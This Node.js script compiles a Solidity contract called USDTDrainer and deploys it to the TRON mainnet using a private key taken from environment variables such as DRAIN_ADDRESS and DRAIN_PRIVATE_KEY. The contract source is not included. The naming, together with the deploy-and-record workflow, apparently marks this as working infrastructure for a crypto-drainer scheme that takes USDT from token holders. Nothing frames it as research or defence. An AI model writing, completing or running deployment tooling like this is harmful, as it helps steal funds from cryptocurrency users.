require('dotenv').config();
const { TronWeb } = require('tronweb');
const fs = require('fs');
const path = require('path');
const solc = require('solc');

// Get environment variables
const USDT = process.env.USDT_CONTRACT;
const OWNER = process.env.DRAIN_ADDRESS;
const PK = process.env.DRAIN_PRIVATE_KEY;
const API_KEY = process.env.TRON_API_KEY;

// Validate required variables
if (!USDT || !OWNER || !PK || !API_KEY) {
  console.error('❌ Missing required env variables:');
  console.error('   USDT_CONTRACT, DRAIN_ADDRESS, DRAIN_PRIVATE_KEY, TRON_API_KEY');
  process.exit(1);
}

async function main() {
  // Read the contract source file
  const contractPath = path.join(__dirname, 'contracts', 'Drainer.sol');
  if (!fs.existsSync(contractPath)) {
    console.error(`❌ Contract file not found: ${contractPath}`);
    process.exit(1);
  }
  const src = fs.readFileSync(contractPath, 'utf8');

  // Compile the contract
  const input = JSON.stringify({
    language: 'Solidity',
    sources: { 'Drainer.sol': { content: src } },
    settings: {
      outputSelection: { '*': { '*': ['abi', 'evm.bytecode.object'] } }
    }
  });

  const output = JSON.parse(solc.compile(input));
  const contract = output.contracts['Drainer.sol']['USDTDrainer'];

  if (!contract) {
    console.error('❌ Compilation error:', JSON.stringify(output.errors, null, 2));
    return;
  }

  console.log('✅ Contract compiled successfully');

  // Initialize TronWeb with your API key and private key
  const tronWeb = new TronWeb({
    fullHost: process.env.TRON_FULL_NODE || 'https://api.trongrid.io',
    headers: { 'TRON-PRO-API-KEY': API_KEY },
    privateKey: PK,
  });

  // Create the smart contract transaction
  const tx = await tronWeb.transactionBuilder.createSmartContract({
    abi: JSON.stringify(contract.abi),
    bytecode: '0x' + contract.evm.bytecode.object,
    feeLimit: 500_000_000,   // 500 TRX (safe limit)
    callValue: 0,
    ownerAddress: OWNER,
    parameters: [USDT, OWNER],
  });

  // Sign and send
  const signed = await tronWeb.trx.sign(tx);
  const receipt = await tronWeb.trx.sendRawTransaction(signed);

  console.log('📦 Deployment receipt:', JSON.stringify(receipt, null, 2));

  if (receipt.code && receipt.code !== 'SUCCESS') {
    console.error('❌ Deployment failed with code:', receipt.code);
    return;
  }

  const contractAddress = tronWeb.address.fromHex(tx.contract_address || receipt.contract_address);
  console.log('\n🎉 CONTRACT DEPLOYED SUCCESSFULLY!');
  console.log(`📄 Contract address: ${contractAddress}`);
  console.log('\n➕ Add this to your .env / Render environment:\n');
  console.log(`DRAIN_CONTRACT=${contractAddress}`);
}

main().catch(e => console.error('Deployment error:', e));